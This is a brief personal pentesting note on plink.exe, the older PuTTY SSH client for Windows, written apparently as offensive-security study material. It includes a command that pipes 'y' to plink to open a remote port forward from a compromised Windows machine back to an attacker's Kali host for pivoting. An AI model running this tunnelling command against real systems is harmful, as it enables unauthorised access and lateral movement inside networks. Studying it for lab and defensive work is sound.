---
title: "plink.exe"
tags:
  - fetus
---
- stored at `/usr/share/windows-resources/binaries/plink.exe`
- basically the older PuTTY ssh client for windows. less useful on modern windows machines since those have their own builtin ssh client 
## usage:
- transfer plink.exe and the private key to the machine to get a rev shell on attacker machine (see [[SSH]] to see how) 
```sh
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE.ppk -N
```
